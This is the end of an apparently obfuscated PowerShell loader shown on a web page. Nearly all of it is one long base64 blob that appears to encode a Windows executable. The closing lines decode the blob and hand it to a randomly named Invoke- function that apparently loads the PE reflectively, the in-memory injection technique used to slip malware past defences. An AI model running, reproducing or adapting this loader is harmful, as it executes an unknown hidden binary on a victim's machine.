AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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"
[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-ZFHXKWAATQPICDS -PEBytes $PEBytes

}
  </pre></body>